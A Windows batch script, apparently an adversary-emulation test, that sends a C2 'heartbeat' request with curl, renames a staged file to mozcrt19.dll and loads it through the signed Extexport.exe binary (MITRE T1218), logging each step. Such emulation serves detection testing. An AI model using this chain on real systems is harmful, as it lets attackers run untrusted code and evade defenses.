@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
SET douyiw=%APPDATA%\9536\61a4cb37
SET ovbdjs=https://10.0.0.49
SET frytcn=https://10.0.0.49/stage/2/icon.png?9536-7
SET eykalkg=BALAM-S2B
SET fkesh=7
SET ecrfwq=visio.txt
SET rgnpbq=9536

SET log=%APPDATA%\!fkesh!\macula-simulations.log
SET res=0
SET err=

echo [%DATE% %TIME%][DEBUG][!eykalkg!]: starting>> "!log!" 2>nul

REM 1. C2 heartbeat
echo [%DATE% %TIME%][DEBUG][!eykalkg!]: heartbeat_start>> "!log!" 2>nul
curl -k -s -o nul "!frytcn!"
echo [%DATE% %TIME%][DEBUG][!eykalkg!]: heartbeat_complete>> "!log!" 2>nul

REM 2. Rename DLL
SET newname=!douyiw!\mozcrt19.dll
echo [%DATE% %TIME%][DEBUG][!eykalkg!]: rename_start=!douyiw!\!ecrfwq!>> "!log!" 2>nul
MOVE /Y "!douyiw!\!ecrfwq!" "!newname!" >nul 2>&1
IF EXIST "!newname!" (
    SET res=1
    SET err=
    echo [%DATE% %TIME%][DEBUG][!eykalkg!]: rename_success>> "!log!" 2>nul
) ELSE (
    SET res=0
    SET err=file_missing
    echo [%DATE% %TIME%][DEBUG][!eykalkg!]: rename_failed>> "!log!" 2>nul
)

REM TTP logging for T1218
SET dt=%DATE:~-4%-%DATE:~4,2%-%DATE:~7,2%
SET tm=%TIME: =0%
echo [!dt! !tm:~0,12!.000][!eykalkg!]: !fkesh!-!rgnpbq!-T1218|Signed_Binary_Proxy_Execution=!res!:!err!>> "!log!" 2>nul

IF !res! EQU 0 exit /b 1

REM 3. Execute via Extexport.exe
echo [%DATE% %TIME%][DEBUG][!eykalkg!]: execution_start>> "!log!" 2>nul
%SystemRoot%\System32\Extexport.exe "!douyiw!" foo bar >nul 2>&1
echo [%DATE% %TIME%][DEBUG][!eykalkg!]: execution_complete>> "!log!" 2>nul